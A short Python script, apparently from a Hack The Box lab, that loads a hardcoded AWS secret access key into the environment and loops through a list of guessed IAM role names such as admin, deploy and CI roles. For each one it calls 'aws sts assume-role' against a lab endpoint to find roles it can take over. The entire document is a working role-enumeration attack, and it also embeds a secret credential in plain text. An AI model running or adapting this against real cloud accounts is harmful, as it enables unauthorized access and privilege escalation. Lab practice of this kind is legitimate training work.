import subprocess
import os

env = os.environ.copy()
env["AWS_ACCESS_KEY_ID"] = "<REDACTED_ACCESS_KEY_ID>"
env["AWS_SECRET_ACCESS_KEY"] = "dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh"
env["AWS_DEFAULT_REGION"] = "us-east-1"

roles = [
    "codebuild-role", "nimbus-build-role", "nimbus-deploy-role",
    "nimbus-admin-role", "nimbus-ci-role", "build-role",
    "nimbus-codebuild-role", "nimbus-devops-role",
]

for role in roles:
    arn = f"arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/{role}"
    r = subprocess.run(
        ["aws", "--endpoint-url", "http://aws.nimbus.htb", "sts", "assume-role",
         "--role-arn", arn, "--role-session-name", "sess01"],
        capture_output=True, text=True, env=env,
    )
    out = (r.stdout + r.stderr).strip()
    print(f"{role:30s} -> {out[:150]}")
